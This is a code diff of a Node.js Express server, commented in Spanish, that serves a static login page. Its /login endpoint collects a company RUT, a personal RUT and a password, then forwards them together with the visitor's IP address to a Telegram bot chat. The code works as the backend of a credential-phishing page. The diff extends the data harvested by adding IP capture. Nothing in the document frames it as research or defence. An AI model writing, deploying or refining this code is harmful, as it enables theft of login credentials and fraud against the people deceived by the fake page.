@@ -1,23 +1,20 @@
 const express = require("express");
 const cors = require("cors");
 const path = require("path");
+// Si tu Node es <18, instala node-fetch y descomenta:
+// const fetch = require("node-fetch");
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-
-// Servir archivos estáticos desde /public
 app.use(express.static(path.join(__dirname, "public")));
 
-// Ruta raíz explícita → index.html
-app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "index.html"));
-});
-
+// Variables de entorno en Render
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
+// Función para enviar mensajes a Telegram
 async function sendTelegramMessage(text) {
   const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
   const res = await fetch(url, {
@@ -30,10 +27,12 @@ async function sendTelegramMessage(text) {
   }
 }
 
-// Endpoint de login → enviar credenciales a Telegram
+// Endpoint de login → recibe RUT Empresa, RUT Persona y Clave
 app.post("/login", async (req, res) => {
-  const { rutPersona, rutEmpresa, passwd } = req.body;
-  const mensaje = `🔔 Nuevo intento de login:\n👤 RUT Persona: ${rutPersona}\n🏢 RUT Empresa: ${rutEmpresa}\n🔑 Contraseña: ${passwd}`;
+  const { rutEmpresa, rutPersona, passwd } = req.body;
+  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+
+  const mensaje = `🔔 Nuevo intento de login:\n🏢 RUT Empresa: ${rutEmpresa || "(sin empresa)"}\n👤 RUT Persona: ${rutPersona || "(sin persona)"}\n🔑 Clave: ${passwd || "(sin clave)"}\n🌐 IP: ${ip}`;
 
   try {
     await sendTelegramMessage(mensaje);
@@ -42,6 +41,11 @@ app.post("/login", async (req, res) => {
     console.error("Error enviando a Telegram:", error);
     res.status(500).json({ status: "error", mensaje: "❌ Error al notificar." });
   }
+});
+
+// Servir index.html por defecto
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
 // Render usa PORT de entorno
